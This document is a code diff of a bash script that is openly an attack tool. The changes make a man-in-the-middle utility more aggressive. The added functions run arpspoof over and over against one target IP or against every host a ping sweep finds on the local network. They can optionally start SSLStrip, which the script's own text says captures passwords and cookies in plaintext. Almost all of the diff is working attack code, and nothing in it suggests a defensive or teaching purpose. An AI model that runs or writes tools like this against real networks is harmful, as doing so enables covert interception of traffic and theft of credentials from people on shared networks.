@@ -56,18 +56,28 @@ fi
 # Function to select a network interface
 function select_interface() {
     while true; do
+        echo -e "\n${MAGENTA}========================================${NC}"
+        echo -e "${CYAN}Available network interfaces:${NC}"
         interfaces=$(ip -o link show | awk -F': ' '{print $2}')
-        PS3="Select your network interface: "
-        select iface in $interfaces; do
-            if [[ -n "$iface" ]]; then
-                selected_iface=$iface
-                echo -e "${GREEN}Selected interface: $selected_iface${NC}"
-                return  # Exit the function when a valid interface is selected
-            else
-                echo -e "${RED}Invalid selection. Try again.${NC}"
-                break  # Restart the select loop to show interfaces again
-            fi
-        done
+        i=1
+        declare -gA iface_map
+        while IFS= read -r line; do
+            echo -e "${GREEN}[$i] $line${NC}"
+            iface_map["$i"]="$line"
+            i=$((i + 1))
+        done <<< "$interfaces"
+
+        # Ask the user for the interface selection
+        echo -e "\n${YELLOW}Enter the number of the network interface you want to use: ${NC}"
+        read -p "$(echo -e "${YELLOW}Your choice: ${NC}")" iface_number
+
+        if [[ -n "${iface_map["$iface_number"]}" ]]; then
+            selected_iface="${iface_map["$iface_number"]}"
+            echo -e "${GREEN}Selected interface: $selected_iface${NC}"
+            return  # Exit the function when a valid interface is selected
+        else
+            echo -e "${RED}Invalid selection. Please try again.${NC}"
+        fi
     done
 }
 
@@ -79,8 +89,9 @@ echo -e "${GREEN}Router IP: $router${NC}"
 # Enable SSLStrip (optional)
 function enable_sslstrip() {
     while true; do
-        echo -e "${CYAN}SSLStrip is a tool that allows you to strip the SSL encryption from HTTPS connections, turning them into HTTP. This enables you to intercept sensitive information like passwords and cookies in plain text.${NC}"
-        read -p "Enable SSLStrip? (yes/y or no/n): " sslstrip_choice
+        echo -e "\n${CYAN}SSLStrip can strip HTTPS encryption, enabling you to capture sensitive data like passwords and cookies in plaintext.${NC}"
+        echo -e "${YELLOW}This can be useful in man-in-the-middle attacks, but it may not work on modern HTTPS configurations.${NC}"
+        read -p "$(echo -e "${YELLOW}Enable SSLStrip? (yes/y or no/n): ${NC}")" sslstrip_choice
         case $sslstrip_choice in
             yes|y)
                 echo -e "${YELLOW}Starting SSLStrip...${NC}"
@@ -100,36 +111,47 @@ function enable_sslstrip() {
     done
 }
 
-# Attack a single device
-function attack_single() {
-    read -p "Enter target IP: " target_ip
-    enable_sslstrip
-    echo -e "${YELLOW}Launching ARP spoofing on $target_ip...${NC}"
-    arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
-    arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
-    echo -e "${GREEN}ARP spoofing attack active. Press CTRL+C to stop.${NC}"
-    wait
+# Attack a single device continuously
+function attack_single_continuous() {
+    while true; do
+        read -p "Enter target IP: " target_ip
+        if [[ -z "$target_ip" ]]; then
+            echo -e "${RED}Invalid IP address. Please try again.${NC}"
+            continue
+        fi
+        enable_sslstrip
+        echo -e "${GREEN}Starting ARP spoofing on $target_ip...${NC}"
+        
+        # Attack the device continuously
+                echo -e "${GREEN}Attacking now... $target_ip Press CTRL+C to stop.${NC}"
+        while true; do
+            arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
+            arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
+            sleep 3  # Shorter sleep to maintain constant pressure on the target
+        done
+    done
 }
 
-# Attack the entire network dynamically
-function attack_all_dynamic() {
+# Attack the entire network continuously
+function attack_all_continuous() {
     network=$(ip -o -f inet addr show $selected_iface | awk '/scope global/ {print $4}')
     IFS=. read -r i1 i2 i3 i4 <<< $(echo $network | cut -d'/' -f1)
     enable_sslstrip
     declare -A attacked_devices
 
-    echo -e "${YELLOW}Scanning network for active devices...${NC}"
+    echo -e "${YELLOW}Scanning network and launching continuous ARP spoofing...${NC}"
     while true; do
         for ip in $(seq 1 254); do
             target_ip="${i1}.${i2}.${i3}.${ip}"
             if ping -c 1 -W 1 $target_ip &>/dev/null && [[ -z "${attacked_devices[$target_ip]}" ]]; then
-                echo -e "${GREEN}New device found: $target_ip. Launching ARP spoofing...${NC}"
                 attacked_devices[$target_ip]=1
+                echo -e "${GREEN}New device found: $target_ip Attacking now... Press CTRL+C to stop.${NC}"  # Print message for new device
+                # Launch ARP spoofing in the background
                 arpspoof -i $selected_iface -t $target_ip $router &>/dev/null &
                 arpspoof -i $selected_iface -t $router $target_ip &>/dev/null &
             fi
         done
-        sleep 60
+        sleep 15  # Sleep before rescanning the network
     done
 }
 
@@ -137,12 +159,12 @@ function attack_all_dynamic() {
 function select_attack_type() {
     while true; do
         echo -e "${YELLOW}Select attack type:${NC}"
-        echo "1) Single Device"
-        echo "2) Entire Network"
+        echo "[1] Single Device (Continuous)"
+        echo "[2] Entire Network (Continuous)"
         read -p "Your choice: " attack_choice
         case $attack_choice in
-            1) attack_single; break ;;
-            2) attack_all_dynamic; break ;;
+            1) attack_single_continuous; break ;;
+            2) attack_all_continuous; break ;;
             *)
                 echo -e "${RED}Invalid choice. Please choose 1 or 2.${NC}"
                 ;;
